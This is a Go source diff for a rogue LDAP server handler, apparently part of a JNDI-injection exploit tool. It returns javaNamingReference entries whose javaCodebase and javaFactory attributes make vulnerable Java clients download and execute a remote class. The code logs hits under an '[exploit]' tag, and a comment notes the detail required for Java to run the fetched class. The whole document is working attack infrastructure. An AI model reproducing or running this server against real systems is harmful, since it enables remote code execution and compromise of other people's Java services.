@@ -10,7 +10,7 @@ import (
 type ldapHandler struct {
 	logger *log.Logger
 
-	url string
+	codeBase string
 }
 
 func (h *ldapHandler) handleBind(w ldapserver.ResponseWriter, _ *ldapserver.Message) {
@@ -25,14 +25,13 @@ func (h *ldapHandler) handleSearch(w ldapserver.ResponseWriter, m *ldapserver.Me
 	// the last "/" about attr can't be deleted, otherwise
 	// java will not execute the downloaded class.
 	addr := m.Client.Addr()
-	attr := message.AttributeValue(h.url + dn + "/")
-	h.logger.Printf("[exploit] %s search java codebase \"%s\"", addr, attr)
+	h.logger.Printf("[exploit] %s search java class \"%s\"", addr, dn)
 
 	res := ldapserver.NewSearchResultEntry(dn)
 	res.AddAttribute("objectClass", "javaNamingReference")
-	res.AddAttribute("javaClassName", "Main")
-	res.AddAttribute("javaFactory", "Main")
-	res.AddAttribute("javaCodebase", attr)
+	res.AddAttribute("javaClassName", message.AttributeValue(dn))
+	res.AddAttribute("javaFactory", message.AttributeValue(dn))
+	res.AddAttribute("javaCodebase", message.AttributeValue(h.codeBase))
 	w.Write(res)
 
 	done := ldapserver.NewSearchResultDoneResponse(ldapserver.LDAPResultSuccess)
